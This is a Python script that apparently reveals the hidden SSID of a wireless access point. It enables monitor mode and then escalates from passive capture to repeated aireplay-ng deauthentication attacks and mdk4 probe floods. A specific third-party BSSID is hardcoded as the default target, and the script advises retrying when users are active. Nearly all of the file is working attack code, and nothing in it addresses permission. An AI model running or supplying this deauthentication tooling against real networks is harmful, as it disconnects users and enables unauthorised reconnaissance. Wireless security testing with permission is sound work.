#!/usr/bin/env python3
"""
================================================================================
HIDDEN SSID REVEALER
================================================================================

Reveals hidden network SSIDs using multiple methods:
1. Passive monitoring (wait for client activity)
2. Deauthentication attack (force clients to reconnect)
3. Probe request flood

TARGET: F0:21:E0:1F:21:C7 (or specify your own)

USAGE:
    sudo python3 reveal_hidden_ssid.py
    sudo python3 reveal_hidden_ssid.py --bssid F0:21:E0:1F:21:C7
    sudo python3 reveal_hidden_ssid.py --bssid F0:21:E0:1F:21:C7 --channel 6

================================================================================
"""

import os
import sys
import time
import subprocess
import re
import argparse
import signal
from pathlib import Path


def run_cmd(cmd, timeout=30):
    """Run command and return output"""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout + result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        return "Timeout", 1
    except Exception as e:
        return str(e), 1


def check_root():
    if os.geteuid() != 0:
        print("\033[91m[ERROR] Must run as root!\033[0m")
        print("Usage: sudo python3 reveal_hidden_ssid.py")
        sys.exit(1)


def find_interface():
    """Find wireless interface"""
    output, _ = run_cmd("iw dev")
    for line in output.split('\n'):
        if 'Interface' in line:
            return line.split()[-1]
    
    # Fallback
    for iface in Path('/sys/class/net').iterdir():
        if (iface / 'wireless').exists():
            return iface.name
    
    return None


def enable_monitor(interface):
    """Enable monitor mode"""
    print(f"[*] Enabling monitor mode on {interface}...")
    
    run_cmd("airmon-ng check kill")
    time.sleep(1)
    
    output, code = run_cmd(f"airmon-ng start {interface}")
    
    # Find monitor interface
    for suffix in ['mon', '']:
        test_if = f"{interface}{suffix}"
        output, _ = run_cmd(f"iwconfig {test_if} 2>/dev/null")
        if 'Mode:Monitor' in output:
            print(f"[+] Monitor mode: {test_if}")
            return test_if
    
    # Try manual
    run_cmd(f"ip link set {interface} down")
    run_cmd(f"iw dev {interface} set type monitor")
    run_cmd(f"ip link set {interface} up")
    
    output, _ = run_cmd(f"iwconfig {interface}")
    if 'Mode:Monitor' in output:
        print(f"[+] Monitor mode: {interface}")
        return interface
    
    print("[!] Failed to enable monitor mode")
    return None


def find_channel(mon_interface, target_bssid):
    """Find the channel of the target AP"""
    print(f"[*] Finding channel for {target_bssid}...")
    
    # Quick scan
    output_dir = f"/tmp/hidden_scan_{int(time.time())}"
    os.makedirs(output_dir, exist_ok=True)
    
    cmd = f"timeout 15 airodump-ng {mon_interface} -w {output_dir}/scan --output-format csv 2>/dev/null"
    
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    print("[*] Scanning all channels for 15 seconds...")
    for i in range(15):
        print(f"\r    {i+1}/15 seconds", end="", flush=True)
        time.sleep(1)
    print()
    
    try:
        process.terminate()
    except:
        pass
    
    # Parse CSV
    csv_files = list(Path(output_dir).glob("*.csv"))
    if csv_files:
        try:
            with open(csv_files[0], 'r', errors='ignore') as f:
                for line in f:
                    if target_bssid.upper() in line.upper():
                        parts = line.split(',')
                        if len(parts) > 3:
                            channel = parts[3].strip()
                            if channel.isdigit():
                                print(f"[+] Found on channel {channel}")
                                return channel
        except Exception as e:
            print(f"[!] Error parsing: {e}")
    
    # Try iw scan
    print("[*] Trying iw scan...")
    run_cmd(f"iw dev {mon_interface} scan trigger 2>/dev/null")
    time.sleep(3)
    output, _ = run_cmd(f"iw dev {mon_interface} scan dump 2>/dev/null")
    
    # Find the BSSID
    lines = output.split('\n')
    for i, line in enumerate(lines):
        if target_bssid.upper() in line.upper():
            # Look for channel in nearby lines
            for j in range(i, min(i+20, len(lines))):
                if 'primary channel:' in lines[j].lower() or 'channel' in lines[j].lower():
                    match = re.search(r'channel[:\s]+(\d+)', lines[j], re.I)
                    if match:
                        channel = match.group(1)
                        print(f"[+] Found on channel {channel}")
                        return channel
    
    print("[!] Could not determine channel automatically")
    return None


def get_vendor(mac):
    """Get vendor from MAC"""
    vendors = {
        "F0:21:E0": "Shenzhen Bilian Electronic",  # Your target
        "B8:27:EB": "Raspberry Pi",
        "DC:A6:32": "Raspberry Pi",
        "24:0A:C4": "Espressif",
        "00:0C:29": "VMware",
    }
    prefix = mac[:8].upper()
    return vendors.get(prefix, "Unknown vendor")


def passive_monitor(mon_interface, target_bssid, channel, duration=60):
    """Passively monitor for SSID reveal"""
    print(f"\n[METHOD 1] Passive monitoring for {duration} seconds...")
    print(f"[*] Watching {target_bssid} on channel {channel}")
    print("[*] Waiting for client activity to reveal SSID...")
    print("[*] Press Ctrl+C to skip to next method\n")
    
    output_dir = f"/tmp/passive_{int(time.time())}"
    os.makedirs(output_dir, exist_ok=True)
    
    cmd = f"timeout {duration} airodump-ng -c {channel} --bssid {target_bssid} -w {output_dir}/cap {mon_interface} 2>&1"
    
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    
    revealed_ssid = None
    start = time.time()
    
    try:
        while time.time() - start < duration:
            # Check CSV for SSID
            csv_files = list(Path(output_dir).glob("*.csv"))
            if csv_files:
                try:
                    with open(csv_files[0], 'r', errors='ignore') as f:
                        for line in f:
                            if target_bssid.upper() in line.upper():
                                parts = line.split(',')
                                if len(parts) > 13:
                                    ssid = parts[13].strip()
                                    if ssid and not ssid.isspace() and len(ssid) > 0:
                                        revealed_ssid = ssid
                                        print(f"\n[+] \033[92mSSID REVEALED: {ssid}\033[0m")
                                        process.terminate()
                                        return ssid
                except:
                    pass
            
            elapsed = int(time.time() - start)
            print(f"\r    Monitoring... {elapsed}/{duration}s", end="", flush=True)
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\n[*] Skipping to next method...")
    finally:
        try:
            process.terminate()
        except:
            pass
    
    print()
    return revealed_ssid


def deauth_attack(mon_interface, target_bssid, channel, rounds=3):
    """Deauth attack to force clients to reconnect"""
    print(f"\n[METHOD 2] Deauthentication attack...")
    print(f"[*] This forces connected clients to reconnect, revealing SSID")
    print(f"[*] Sending {rounds} rounds of deauth packets...\n")
    
    # Set channel
    run_cmd(f"iw dev {mon_interface} set channel {channel}")
    time.sleep(0.5)
    
    output_dir = f"/tmp/deauth_{int(time.time())}"
    os.makedirs(output_dir, exist_ok=True)
    
    # Start airodump in background to capture
    airodump_cmd = f"airodump-ng -c {channel} --bssid {target_bssid} -w {output_dir}/cap {mon_interface}"
    airodump_proc = subprocess.Popen(airodump_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    time.sleep(2)
    
    revealed_ssid = None
    
    try:
        for i in range(rounds):
            print(f"[*] Deauth round {i+1}/{rounds}...")
            
            # Send deauth
            deauth_cmd = f"aireplay-ng -0 10 -a {target_bssid} {mon_interface} 2>&1"
            output, _ = run_cmd(deauth_cmd, timeout=15)
            
            if 'No such BSSID' in output:
                print(f"[!] AP not found on channel {channel}")
                break
            
            time.sleep(3)
            
            # Check for SSID
            csv_files = list(Path(output_dir).glob("*.csv"))
            if csv_files:
                try:
                    with open(csv_files[0], 'r', errors='ignore') as f:
                        for line in f:
                            if target_bssid.upper() in line.upper():
                                parts = line.split(',')
                                if len(parts) > 13:
                                    ssid = parts[13].strip()
                                    if ssid and not ssid.isspace():
                                        revealed_ssid = ssid
                                        print(f"\n[+] \033[92mSSID REVEALED: {ssid}\033[0m")
                                        return ssid
                except:
                    pass
            
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\n[*] Interrupted")
    finally:
        try:
            airodump_proc.terminate()
        except:
            pass
    
    return revealed_ssid


def mdk4_probe(mon_interface, target_bssid, channel, duration=30):
    """Use mdk4 to send probe requests"""
    print(f"\n[METHOD 3] MDK4 probe request flood...")
    
    # Check if mdk4 is available
    output, code = run_cmd("which mdk4")
    if code != 0:
        print("[!] mdk4 not installed. Install with: sudo apt install mdk4")
        return None
    
    print(f"[*] Sending probe requests for {duration} seconds...")
    
    # Set channel
    run_cmd(f"iw dev {mon_interface} set channel {channel}")
    
    # Start mdk4
    cmd = f"timeout {duration} mdk4 {mon_interface} p -t {target_bssid} 2>&1"
    
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    
    try:
        for i in range(duration):
            print(f"\r    {i+1}/{duration}s", end="", flush=True)
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        try:
            process.terminate()
        except:
            pass
    
    print()
    return None


def check_oui(bssid):
    """Check MAC vendor/OUI"""
    print(f"\n[*] MAC Address Analysis:")
    print(f"    BSSID: {bssid}")
    print(f"    Vendor: {get_vendor(bssid)}")
    
    # Additional lookup
    prefix = bssid[:8].replace(':', '').upper()
    print(f"    OUI: {prefix}")
    
    # F0:21:E0 = Shenzhen Bilian Electronic Co (makes WiFi modules)
    if bssid.upper().startswith("F0:21:E0"):
        print(f"    \033[93m[!] This is a Shenzhen Bilian device (common in IoT/routers)\033[0m")


def restore_interface(mon_interface, original_interface):
    """Restore interface"""
    print(f"\n[*] Restoring interface...")
    run_cmd(f"airmon-ng stop {mon_interface} 2>/dev/null")
    run_cmd("systemctl start NetworkManager 2>/dev/null")
    print("[+] Done")


def main():
    parser = argparse.ArgumentParser(description='Reveal Hidden SSID')
    parser.add_argument('-b', '--bssid', default='F0:21:E0:1F:21:C7',
                        help='Target BSSID (default: F0:21:E0:1F:21:C7)')
    parser.add_argument('-c', '--channel', type=int,
                        help='Channel (auto-detect if not specified)')
    parser.add_argument('-i', '--interface',
                        help='Wireless interface (auto-detect if not specified)')
    parser.add_argument('--passive-only', action='store_true',
                        help='Only use passive monitoring (no deauth)')
    
    args = parser.parse_args()
    
    print("\n" + "=" * 60)
    print("  HIDDEN SSID REVEALER")
    print("=" * 60 + "\n")
    
    check_root()
    
    target_bssid = args.bssid.upper()
    print(f"[*] Target: {target_bssid}")
    
    check_oui(target_bssid)
    
    # Find interface
    interface = args.interface or find_interface()
    if not interface:
        print("[!] No wireless interface found!")
        sys.exit(1)
    
    print(f"[*] Interface: {interface}")
    
    original_interface = interface
    mon_interface = None
    revealed_ssid = None
    
    try:
        # Enable monitor mode
        mon_interface = enable_monitor(interface)
        if not mon_interface:
            print("[!] Could not enable monitor mode")
            sys.exit(1)
        
        # Find channel
        channel = args.channel
        if not channel:
            channel = find_channel(mon_interface, target_bssid)
        
        if not channel:
            print("\n[!] Could not find channel. Please specify with -c")
            print("    Example: sudo python3 reveal_hidden_ssid.py -b F0:21:E0:1F:21:C7 -c 6")
            
            # Try all common channels
            print("\n[*] Trying common 2.4GHz channels...")
            for ch in [1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10]:
                print(f"\r    Trying channel {ch}...", end="", flush=True)
                run_cmd(f"iw dev {mon_interface} set channel {ch}")
                output, _ = run_cmd(f"timeout 3 airodump-ng -c {ch} --bssid {target_bssid} {mon_interface} 2>&1")
                if 'No such BSSID' not in output and target_bssid in output:
                    channel = ch
                    print(f"\n[+] Found on channel {ch}!")
                    break
            
            if not channel:
                print("\n[!] AP not found on any channel. It may be:")
                print("    - On 5GHz band")
                print("    - Turned off")
                print("    - Out of range")
                sys.exit(1)
        
        print(f"\n[*] Using channel: {channel}")
        
        # Method 1: Passive monitoring
        revealed_ssid = passive_monitor(mon_interface, target_bssid, channel, duration=30)
        
        if revealed_ssid:
            print(f"\n\033[92m[SUCCESS] SSID: {revealed_ssid}\033[0m")
        elif not args.passive_only:
            # Method 2: Deauth attack
            revealed_ssid = deauth_attack(mon_interface, target_bssid, channel, rounds=5)
            
            if revealed_ssid:
                print(f"\n\033[92m[SUCCESS] SSID: {revealed_ssid}\033[0m")
            else:
                # Method 3: MDK4
                mdk4_probe(mon_interface, target_bssid, channel, duration=20)
                
                # Final check
                print("\n[*] Final passive check...")
                revealed_ssid = passive_monitor(mon_interface, target_bssid, channel, duration=15)
        
        if revealed_ssid:
            print("\n" + "=" * 60)
            print(f"  \033[92mSSID SUCCESSFULLY REVEALED!\033[0m")
            print("=" * 60)
            print(f"\n  BSSID:  {target_bssid}")
            print(f"  SSID:   {revealed_ssid}")
            print(f"  Channel: {channel}")
            print(f"  Vendor: {get_vendor(target_bssid)}")
            print()
        else:
            print("\n" + "=" * 60)
            print("  \033[93mSSID NOT REVEALED\033[0m")
            print("=" * 60)
            print("\n  Possible reasons:")
            print("    1. No clients connected to this network")
            print("    2. Clients not actively reconnecting")
            print("    3. AP has client isolation enabled")
            print("    4. Network is not in use")
            print("\n  Try:")
            print("    - Wait longer with passive monitoring")
            print("    - Try at a different time when users are active")
            print(f"    - Manual: sudo aireplay-ng -0 20 -a {target_bssid} {mon_interface}")
            print()
            
    except KeyboardInterrupt:
        print("\n\n[*] Interrupted by user")
    
    finally:
        if mon_interface:
            restore_interface(mon_interface, original_interface)
    
    return revealed_ssid


if __name__ == "__main__":
    main()